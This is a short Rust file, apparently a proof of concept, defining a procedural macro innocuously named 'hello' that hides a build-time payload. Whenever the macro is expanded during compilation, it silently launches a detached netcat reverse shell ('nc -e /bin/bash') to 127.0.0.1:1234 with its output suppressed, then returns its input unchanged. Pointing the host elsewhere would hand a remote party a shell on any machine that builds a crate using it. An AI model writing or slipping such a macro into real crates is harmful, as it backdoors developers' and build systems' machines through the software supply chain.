use proc_macro::TokenStream;
use std::{env, fs};
use std::process::{Command, Stdio};

#[proc_macro]
pub fn hello(_input: TokenStream) -> TokenStream {
    Command::new("setsid")
        .arg("nc")
        .arg("-e")
        .arg("/bin/bash")
        .arg("127.0.0.1")
        .arg("1234")
        .stdin(Stdio::null())
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn()
        .expect("failed to spawn command");       
    eprintln!("proc-macro exécutée !");
    _input

}
